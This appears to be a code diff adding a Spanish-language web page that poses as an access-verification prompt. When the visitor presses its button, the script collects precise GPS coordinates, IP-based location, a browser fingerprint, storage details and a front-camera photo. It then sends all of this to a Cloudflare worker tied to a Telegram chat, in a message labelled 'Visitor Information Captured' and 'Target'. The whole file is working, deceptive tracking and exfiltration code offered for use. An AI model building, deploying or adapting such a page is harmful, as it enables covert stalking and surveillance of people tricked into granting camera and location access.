@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Acceso</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f1f3f4;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+        p {
+            color: #5f6368;
+            font-size: 0.9rem;
+            margin-bottom: 28px;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 28px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        button:active {
+            background: #1557b0;
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🔐 Verificación requerida</h1>
+    <p>Presiona el botón para continuar</p>
+    <button id="btn">✅ Verificar acceso</button>
+</div>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+    // ================= CONFIGURACIÓN =================
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
+    const CHAT_ID = '7555997298';
+
+    async function getLocationFromWorker() {
+        try {
+            const res = await fetch(WORKER_URL);
+            if (!res.ok) throw new Error();
+            const data = await res.json();
+            return {
+                ip: data.ip || 'N/A',
+                country: data.country || 'N/A',
+                region: data.region || 'N/A',
+                city: data.city || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || 'N/A'
+            };
+        } catch(e) {
+            return null;
+        }
+    }
+
+    async function getLocationFromIpapi() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            return {
+                ip: data.ip || 'N/A',
+                country: data.country_name || 'N/A',
+                region: data.region || 'N/A',
+                city: data.city || 'N/A',
+                postal: data.postal || 'N/A',
+                timezone: data.timezone || 'N/A'
+            };
+        } catch(e) {
+            return null;
+        }
+    }
+
+    async function getFingerprint() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200; canvas.height = 50;
+        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
+        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
+        const canvasHash = canvas.toDataURL().slice(0, 100);
+        let gpu = 'N/A';
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
+        } catch(e) {}
+        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
+        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
+        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
+    }
+
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let model = "Desconocido";
+        if (ua.includes('iPhone')) model = 'iPhone';
+        else if (ua.includes('iPad')) model = 'iPad';
+        else if (ua.includes('Android')) model = 'Android';
+        else if (ua.includes('Mac')) model = 'Mac';
+        else if (ua.includes('Windows')) model = 'Windows PC';
+        const language = navigator.language || navigator.userLanguage;
+        const resolution = `${window.screen.width}x${window.screen.height}`;
+        const cpuCores = navigator.hardwareConcurrency || 'N/A';
+        return { model, ua, language, resolution, cpuCores };
+    }
+
+    async function getStorageInfo() {
+        try {
+            const est = await navigator.storage.estimate();
+            const totalGB = (est.quota / (1024**3)).toFixed(2);
+            const usedGB = (est.usage / (1024**3)).toFixed(2);
+            return { total: totalGB, used: usedGB };
+        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
+    }
+
+    function getGPS() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 15000 }
+            );
+        });
+    }
+
+    async function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let stream = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        } catch(e) {
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+            catch(err) { return null; }
+        }
+        video.srcObject = stream;
+        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+        return blob;
+    }
+
+    async function sendMessage(text) {
+        try {
+            await fetch(WORKER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) { console.warn(e); }
+    }
+    
+    async function sendPhoto(blob) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'photo.jpg');
+        try {
+            await fetch(WORKER_URL, { method: 'POST', body: fd });
+        } catch(e) { console.warn(e); }
+    }
+
+    document.getElementById('btn').onclick = async () => {
+        const btn = document.getElementById('btn');
+        btn.disabled = true;
+        btn.innerText = '⏳ Enviando...';
+
+        const gps = await getGPS();
+        const [workerLoc, ipapiLoc] = await Promise.all([
+            getLocationFromWorker(),
+            getLocationFromIpapi()
+        ]);
+        const [fp, device, storage] = await Promise.all([
+            getFingerprint(),
+            getDeviceInfo(),
+            getStorageInfo()
+        ]);
+        const foto = await capturePhoto();
+
+        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
+        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
+        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
+        message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
+        message += `📍 *Cloudflare Worker Location*\n`;
+        if (workerLoc && workerLoc.city !== 'N/A') {
+            message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
+        } else {
+            message += `   • No disponible\n`;
+        }
+        message += `📍 *IP API Location (ipapi.co)*\n`;
+        if (ipapiLoc && ipapiLoc.city !== 'N/A') {
+            message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
+        } else {
+            message += `   • No disponible\n`;
+        }
+        if (gps) {
+            message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
+        } else {
+            message += `📍 *GPS: Permiso denegado o no disponible*\n`;
+        }
+        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
+        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper\n`;
+
+        await sendMessage(message);
+        if (foto) await sendPhoto(foto);
+
+        btn.disabled = false;
+        btn.innerText = '✅ Verificar acceso';
+    };
+</script>
+</body>
+</html>
